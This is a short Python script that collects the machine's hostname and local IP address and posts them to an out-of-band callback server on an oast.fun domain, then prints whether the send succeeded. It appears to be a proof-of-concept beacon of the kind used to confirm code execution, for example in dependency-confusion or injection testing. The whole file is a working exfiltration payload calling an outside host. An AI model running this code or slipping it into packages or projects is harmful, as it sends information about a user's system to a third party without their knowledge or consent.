import socket
import requests

# Get hostname
hostname = socket.gethostname()

# Get local IP
ip = socket.gethostbyname(hostname)

# OAST server URL
oast_url = "http://xiwgprqhkpojanlkfbuwju8typuc21u9e.oast.fun"

# Send data to OAST server
try:
    requests.post(oast_url, data={"hostname": hostname, "ip": ip})
    print(f"Sent hostname ({hostname}) and IP ({ip}) to OAST server.")
except Exception as e:
    print(f"Failed to send: {e}")
